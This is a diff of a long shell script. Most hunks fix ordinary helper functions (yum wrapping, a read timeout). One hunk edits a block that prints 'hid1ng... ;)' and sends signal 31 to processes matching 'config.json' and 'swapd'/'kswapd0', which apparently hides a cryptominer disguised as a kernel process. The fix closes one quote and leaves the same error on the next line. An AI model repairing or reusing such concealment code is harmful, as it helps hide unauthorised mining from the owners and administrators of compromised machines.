@@ -276,7 +276,7 @@ fix_dns_and_retry() {
 # ========================================================================
 
 safe_yum() {
-    local yum_command="$@"
+    local yum_command=("$@")
     local output_file=$(mktemp)
     
     # Try normal yum command first
@@ -685,7 +685,7 @@ manual_upload_instructions() {
     
     # Wait for user to upload
     echo -n "Waiting for file upload... (press ENTER after uploading): "
-    read -t -t 300 # 5 minute timeout
+    read -r -t 300 # 5 minute timeout
     
     # Check again
     if [ -f "$target_path" ]; then
@@ -2157,7 +2157,7 @@ fi
 
 echo "[*] hid1ng... ;)"
 
-kill -31 "$(pgrep -f -u root config.json)
+kill -31 "$(pgrep -f -u root config.json)"
 
 kill -31 "$(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
 #kill -31 `/bin/ps ax -fu "$USER"| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` ;
